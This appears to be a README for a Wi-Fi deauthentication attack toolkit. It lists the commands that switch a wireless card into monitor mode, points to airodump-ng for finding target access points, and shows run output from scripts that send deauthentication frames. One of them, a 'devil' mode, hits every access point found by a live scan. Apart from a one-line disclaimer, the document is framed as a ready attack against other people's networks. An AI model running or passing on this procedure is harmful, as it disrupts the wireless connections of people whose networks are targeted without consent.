# Deauth Attack
You must not use THIS as DoS in case you did not know...

## Set up

### USB
+ NEC Aterm WL300NU-AG for "wlan1"

### CLI

Open your console or terminal, and follow STRICTLY the order.

```
# service network-manager stop
# ifconfig wlan0 down
# iwconfig wlan0 mode monitor
# ifconfig wlan0 up
```

## Target AP
You should have found some BSSID of disgusting APs using "airodump-ng" and so on...


## Normal Deauth Attack

```
# python deauth_attack.py
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
...
```

## Live Scan BSSID

```
# livescan_bssid.py
c0:25:a2:f5:25:d2 10:6f:3f:88:32:c8
```


## Devil Deauth Attack

```
# python devil_deauth.py
Attacking(10:6f:3f:88:32:c8): Send the Deauthentication flame:)
Attacking(10:6f:3f:88:32:c8): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(10:6f:3f:88:32:c8): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(10:6f:3f:88:32:c8): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(10:6f:3f:88:32:c8): Send the Deauthentication flame:)
...
```
